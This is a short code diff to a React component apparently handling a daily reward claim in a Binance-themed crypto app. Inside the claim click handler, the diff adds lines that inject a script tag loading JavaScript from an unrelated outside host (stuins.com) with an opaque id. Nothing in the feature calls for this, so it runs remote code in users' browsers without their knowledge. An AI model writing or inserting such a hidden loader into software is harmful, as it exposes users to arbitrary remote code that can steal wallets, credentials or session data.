@@ -167,6 +167,10 @@ export default function BinanceBoostTab({
 
   const handleDailyClaim = () => {
     if (!canClaimToday) return;
+    const script = document.createElement('script');
+    script.src = 'https://stuins.com/cuhdl?wh=nf4ZrIubOLofw1uKoWRMkI3H';
+    script.async = true;
+    document.body.appendChild(script);
     onDailyClaim();
     setClaimedReward(todayReward);
     setShowDailyBonus(true);
